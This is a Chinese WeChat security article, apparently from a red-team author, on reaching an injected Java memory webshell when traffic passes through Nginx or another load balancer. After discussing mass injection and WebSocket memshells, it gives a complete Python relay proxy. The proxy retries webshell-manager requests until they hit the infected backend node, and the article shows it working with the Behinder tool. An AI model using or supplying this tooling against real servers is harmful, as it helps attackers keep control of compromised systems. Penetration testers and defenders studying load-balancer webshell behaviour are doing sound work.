---
title: 负载均衡下打内存马的奇淫技巧
url: https://mp.weixin.qq.com/s/wiaaXq-nnL_QFZNu_HXoAg
source: Doonsec's feed
date: 2026-03-21
fetch_date: 2026-03-22T04:17:31.879054
---

# 负载均衡下打内存马的奇淫技巧

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/KA5KNdck7peECia2hx5p3aZUadpDgl1emhwH3YLSGQyrQxTRf5gBXkrpTg0r2ciaFNJskJeouNtoOHPmvAvCdFHl7UicVBAblF70uxs5Ykb6ds/0?wx_fmt=jpeg)

# 负载均衡下打内存马的奇淫技巧

原创

ptr
ptr

UpRoot

![]()

在小说阅读器中沉浸阅读

### 起

负载均衡下的内存马连接与利用，一直是渗透测试和红队评估中的进阶难点。

当目标系统前端存在Nginx、F5或云厂商的负载均衡器时，流量会被分发到后端多个服务器中。如果你只向其中一台服务器注入了内存马，当你尝试发送控制命令时，负载均衡器可能会将你的请求路由到**未被感染的健康节点上**，导致命令执行失败。

![](https://mmbiz.qpic.cn/mmbiz_png/KA5KNdck7pdFGpFLBTSDicf4ibxUKOUPyqOymgALIMh7EOPdqoSSfwsQHdaZbLeibnWAia30gqt9icQsNcSoyAq9mmn5bicic5p1cMImPPMJ6onRIM/640?wx_fmt=png&from=appmsg)

那目前有最简单暴力的方法时**盲打全量注入**，也就是批量发包来实现。其本质上时利用负载均衡的轮询或随机分发机制，发送数百上千次数据包，直到后端的每一个节点都被成功植入了内存马。

这种方法好是好，但是你红队评估完成后，客户要求你清理内存马，又开始头疼了。

有人提出用**websocket内存马**，这也是一种很好的解决方法。其本质上是利用了WebSocket协议在完成握手后，会建立一条持久的TCP长连接。负载均衡器在处理WebSocket时，会保持这条全双工通道的开启。

**MemShellParty**已经有了这种内存马，但似乎兼容性还有待提高，另一方面，不是所有的服务器都支持websocket协议的，所以这也不是一种通杀的方法。

### 承

我们来看一个具体的实战场景。

通过反序列化漏洞打入内存马后，通过冰蝎3进行连接。

![](https://mmbiz.qpic.cn/mmbiz_png/KA5KNdck7pfzcAib649ZG6lzFAUF7HfBZGyWBYL6pCzTgPnKfXCHEotzgYBP8T3dv0FbmRA5dJFbtH755wbsvIjfC0gnCbvX9yv5Gsr3wQsY/640?wx_fmt=png&from=appmsg)

冰蝎进行连接的时候，会触发两次连接，第一次连接成功命中节点有了回显，第二次连接由于Nginx的轮询机制，导致访问404。

那最后的结果就是连接失败。

![](https://mmbiz.qpic.cn/mmbiz_png/KA5KNdck7peq8U5mgg0xvs5FwELIJnkSXKdeqOvN2DWhooqic5X36VpZyOt7avJiaFIhhKx6MdLoS7r2YFwsibyv6icFctyUZibLAIJIhUrRgZCc/640?wx_fmt=png&from=appmsg)

不妨将这两个数据包发到重放模块中，具体观察下。

请求一次。

![](https://mmbiz.qpic.cn/mmbiz_png/KA5KNdck7pdJu72lnFaCrRlyOdiaQUP33Vnf6Ob3x5KY9CYXN7CRl0DfdHestkxhjGvH2udFugzIMZicJqASl7cyx36npPwicrewlibgdgp3ub0/640?wx_fmt=png&from=appmsg)

请求二次。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/KA5KNdck7pe7tHLuee0pD2Z9Jvdv8tB6z5ibodibfSTc118tcglA3icdfWnRbUYuicevrKrrkOtXIYWibMT42RnOak1D6hiaiakVIQhkvjNtrhXPuM/640?wx_fmt=png&from=appmsg)

那我们就可以观察到，Nginx轮询两次一循环。

当然这只是针对当前攻防情景，大多数情况下，可能会有十次、甚至数十次。

### 转

那基于此种现象，我们可以有这样的想法：

**做一个中转代理服务器，将webshell管理器流量导入到中转，如果响应200则返回，如果响应非200则由中转代为请求，直到响应200为止。**

借助python我们可以搭起来一个简单的中转代理服务器。

```
import time
from http.server import BaseHTTPRequestHandler, HTTPServer
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

LISTEN_PORT = 8086# 本地监听端口
TARGET_URL = "http://ip:port/path"# 目标实际的内存马地址
MAX_RETRIES = 100# 最大重试次数
RETRY_DELAY = 0.1# 每次重试间隔(秒)，避免请求过快被 WAF 拦截

class ProxyHTTPRequestHandler(BaseHTTPRequestHandler):
    def handle_proxy_request(self):
        content_length = int(self.headers.get('Content-Length', 0))
        post_data = self.rfile.read(content_length) if content_length > 0elseNone

        req_headers = {key: value for key, value in self.headers.items()}
        if'Host'in req_headers:
            del req_headers['Host']

        print(f"\n[*] 收到来自管理工具的请求，开始向目标盲打路由...")

        for attempt in range(1, MAX_RETRIES + 1):
            try:
                response = requests.request(
                    method=self.command,
                    url=TARGET_URL,
                    headers=req_headers,
                    data=post_data,
                    verify=False,
                    timeout=10,
                    allow_redirects=False
                )

                if response.status_code == 200:
                    print(f"[+] 第 {attempt} 次尝试: 成功命中被感染节点! (Status: 200)")

                    self.send_response(200)
                    for k, v in response.headers.items():
                        if k.lower() notin ['transfer-encoding', 'content-encoding', 'connection']:
                            self.send_header(k, v)
                    self.end_headers()
                    self.wfile.write(response.content)
                    return
                else:
                    print(f"[-] 第 {attempt} 次尝试: 命中健康节点 (Status: {response.status_code})，继续重试...")
                    time.sleep(RETRY_DELAY)

            except requests.exceptions.RequestException as e:
                print(f"[!] 网络请求异常: {e}")
                time.sleep(RETRY_DELAY)

        # 超过最大重试次数仍未命中
        print("[-] 达到最大重试次数，放弃当前请求。")
        self.send_response(502)
        self.end_headers()
        self.wfile.write(b"Bad Gateway: Reached max retries to find the infected node.")

    def do_GET(self):
        self.handle_proxy_request()

    def do_POST(self):
        self.handle_proxy_request()

    def log_message(self, format, *args):
        pass

if __name__ == '__main__':
    server_address = ('127.0.0.1', LISTEN_PORT)
    httpd = HTTPServer(server_address, ProxyHTTPRequestHandler)
    print(f"[*] 本地中转代理已启动: http://127.0.0.1:{LISTEN_PORT}")
    print(f"[*] 请将 Webshell 管理工具的 URL 设置为上述本地地址。")
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        print("\n[*] 代理已停止。")
        httpd.server_close()
```

我们将环境配置好：

![](https://mmbiz.qpic.cn/mmbiz_png/KA5KNdck7pd02F9pYicI10kDWWmADNFiavMMGnFt2chrXMEOUsSQAdcNHFEZD9PgQMG1p1Dk7gO2xibI8Z7M5K9YGCDBmTAziceJ5XbZ7ZeIB0g/640?wx_fmt=png&from=appmsg)

连接内存马：

![](https://mmbiz.qpic.cn/mmbiz_png/KA5KNdck7pfFrAQnhT20QxtpuZayAn8c3Cw6IyLfuXudRm0vFFtgBX7uNpiasq3ohElZ0RbNuJeibXTghpObmsmrKF3wa0gdN7PUwSiapPChib4/640?wx_fmt=png&from=appmsg)

可以看到通过这种机制，我们已经可以实现在负载均衡下进行连接内存马了。

### 合

方法虽然轻量，但足以破局。或许已有师傅看完此文，准备去重构自己的管理工具了。

每个难点都会有解决办法的，站点如此，我想人生也是；都说车灯最多只能照亮50米，但依旧可以走完全程。

我想我把眼前的事情做好，未来，我或许有机会，体验那句，拜水都江堰、问道青城山。

共勉...

---

**参考文章：**

1、https://party.mem.mk/ui/docs/middleware/tomcat-websocket#%E7%BB%95%E8%BF%87-nginx-%E6%88%96-cdn-%E9%99%90%E5%88%B6

2、[https://mp.weixin.qq.com/s/tpXuZ6Vt6qGLDF6EEIvYPg](https://mp.weixin.qq.com/s?__biz=Mzg2ODYxMzY3OQ==&mid=2247514240&idx=1&sn=ef24b086006cda38eb29674f7c8dedf0&scene=21#wechat_redirect)
3、https://github.com/zema1/suo5

- END -

预览时标签不可点

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/sz_mmbiz_png/xVRYUEtHibmvaoURJ0GJicia6k2fibfoowzduKTIkiaiaEF2Z2jrzjeX9JaCet9jpQRba16OImWqgkwEuNtibYlTjsoQA/0?wx_fmt=png)

UpRoot

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/sz_mmbiz_png/xVRYUEtHibmvaoURJ0GJicia6k2fibfoowzduKTIkiaiaEF2Z2jrzjeX9JaCet9jpQRba16OImWqgkwEuNtibYlTjsoQA/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过